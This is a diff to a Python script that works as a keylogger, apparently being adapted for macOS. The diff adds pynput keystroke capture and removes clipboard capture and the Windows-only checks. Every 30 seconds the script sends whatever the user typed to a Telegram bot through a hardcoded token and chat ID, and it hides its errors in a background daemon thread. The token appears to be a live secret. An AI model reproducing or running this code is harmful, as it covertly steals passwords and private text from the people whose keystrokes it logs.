@@ -1,8 +1,17 @@
 import platform
 import threading
 import time
+from time import sleep
+
 import requests
 from datetime import datetime
+try:
+    from pynput import keyboard as pynput_keyboard
+except ImportError:
+    pass
+
+if platform.system() != "Darwin":
+    pass
 
 CHAT_ID = "5018443124"
 TELEGRAM_TOKEN = "7656633959:AAF_nev0Abbu5Sr4ETtE9vYdkf3mavCvcps"
@@ -22,80 +31,59 @@ def snd_telg(message):
         return False
 
 def monitor_input():
-    if platform.system() != "Windows":
-        return
-
-    try:
-        import keyboard
-        import pyperclip
-    except ImportError:
-        return
-
     typed_text = []
     last_clipboard = ""
     last_sent_time = time.time()
 
-    def on_key_press(event):
+    # Функция обработки нажатий клавиш
+    def on_press(key):
         try:
-            if event.name in ("ctrl", "alt", "shift", "tab", "esc"):
+            # Игнорируем модификаторы и специальные клавиши
+            if key in (pynput_keyboard.Key.ctrl, pynput_keyboard.Key.ctrl_l, pynput_keyboard.Key.ctrl_r,
+                       pynput_keyboard.Key.alt, pynput_keyboard.Key.alt_l, pynput_keyboard.Key.alt_r,
+                       pynput_keyboard.Key.shift, pynput_keyboard.Key.shift_l, pynput_keyboard.Key.shift_r,
+                       pynput_keyboard.Key.tab, pynput_keyboard.Key.esc):
                 return
-            elif event.name == "space":
+            elif key == pynput_keyboard.Key.space:
                 typed_text.append(" ")
-            elif event.name == "enter":
+            elif key == pynput_keyboard.Key.enter:
                 typed_text.append("\n")
-            elif event.name == "backspace":
+            elif key == pynput_keyboard.Key.backspace:
                 if typed_text:
                     typed_text.pop()
-            elif len(event.name) == 1:
-                typed_text.append(event.name)
+            else:
+                try:
+                    typed_text.append(key.char)
+                except AttributeError:
+                    pass
         except Exception as e:
             pass
-    try:
-        keyboard.on_press(on_key_press)
-    except Exception as e:
-        return
+
+    listener = pynput_keyboard.Listener(on_press=on_press)
+    listener.start()
 
     while True:
         try:
-            try:
-                clipboard_content = pyperclip.paste()
-                if clipboard_content != last_clipboard:
-                    last_clipboard = clipboard_content
-            except Exception as e:
-                pass
-
             current_time = time.time()
             if current_time - last_sent_time >= 30:
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                timestamp = datetime.now()
                 message = f"<b>Timestamp:</b> {timestamp}\n"
                 if typed_text:
                     message += f"<b>Typed:</b> {''.join(typed_text)}\n"
-                if last_clipboard:
-                    message += f"<b>Clipboard:</b> {last_clipboard}\n"
 
-                if typed_text or last_clipboard:
+                if typed_text:
                     success = snd_telg(message)
                     if success:
                         typed_text.clear()
-                        last_clipboard = ""
-                else:
-                    pass
-
                 last_sent_time = current_time
-
         except Exception as e:
-            pass
+            time.sleep(1)
 
-
-def start_monitoring():
-    if platform.system() == "Windows":
-        try:
-            import keyboard
-            import pyperclip
-        except ImportError:
-            return
-
+def start_monitoring_m():
+    try:
         thread = threading.Thread(target=monitor_input, daemon=True)
         thread.start()
-    else:
+    except KeyboardInterrupt:
+        pass
+    except Exception as e:
         pass
